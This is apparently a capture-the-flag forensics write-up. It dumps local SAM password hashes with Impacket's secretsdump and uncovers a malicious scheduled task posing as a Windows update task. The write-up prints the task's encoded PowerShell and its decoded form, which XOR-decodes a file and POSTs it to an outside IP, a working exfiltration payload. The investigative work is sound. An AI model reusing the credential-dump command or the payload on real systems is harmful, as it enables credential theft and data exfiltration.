# Privilege Escalation & Persistence
## So Many Options!
Read out sam database:
```
ubuntu@ubuntu:~/Downloads/hives$ secretsdump.py -sam sam -system system LOCAL
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xfef8482eca8898c9ef0990dae88a4a62
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a86d6fcd7ef0a94b9137607d85a464f8:::
matches:1000:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
morty:1001:aad3b435b51404eeaad3b435b51404ee:8de1664032f84dc693102d506539c49f:::
operator01:1002:aad3b435b51404eeaad3b435b51404ee:e337e31aa4c614b2895ad684a51156df:::
svc_historian:1006:aad3b435b51404eeaad3b435b51404ee:9e1708935a8ec3f72a94cdd8dd3da57a:::
[*] Cleaning up... 
```

## Please Schedule an Appointment
Find the sus task:
```
ubuntu@ubuntu:~/Downloads/ScheduledTasks$ less ScheduledTasks/Microsoft_Windows_UpdateOrchestrator_USO_UxBroker_Display.xml 


    <Exec>
      <Command>%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -NonInteractive -EncodedCommand JAB4AGsAPQAwAHgAMwA3ADsAJABwAD0AIgAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFQAaABlAG0AZQBzAFwAYQBlAHIAbwAuAHQAbQBwACIAOwAkAGIAPQBbAFMAeQBzAHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBSAGUAYQBkAEEAbABsAEIAeQB0AGUAcwAoACQAcAApADsAJABmAD0AKAAkAGIAfAAlAHsAWwBjAGgAYQByAF0AKAAkAF8AIAAtAGIAeABvAHIAIAAkAHgAawApAH0AKQAtAGoAbwBpAG4AJwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAXQA6ADoAbgBlAHcAKAApAC4AVQBwAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4ANAAuADIAMAAuADEANQAvAGMAbwBsAGwAZQBjAHQAIgAsACIAUABPAFMAVAAiACwAJABmACkA</Arguments>
    </Exec>
```

Cyberchef: Base64 + Decode text UTF-16LE (1200)

```
$xk=0x37;$p="$env:APPDATA\Microsoft\Windows\Themes\aero.tmp";$b=[System.IO.File]::ReadAllBytes($p);$f=($b|%{[char]($_ -bxor $xk)})-join'';[System.Net.WebClient]::new().UploadString("http://10.4.20.15/collect","POST",$f)
```

## Who's Cutting Onions?
Use XOR key 0x37 from prev task to decode `APPDATA\Microsoft\Windows\Themes\aero.tmp` (e.g. with cyberchef)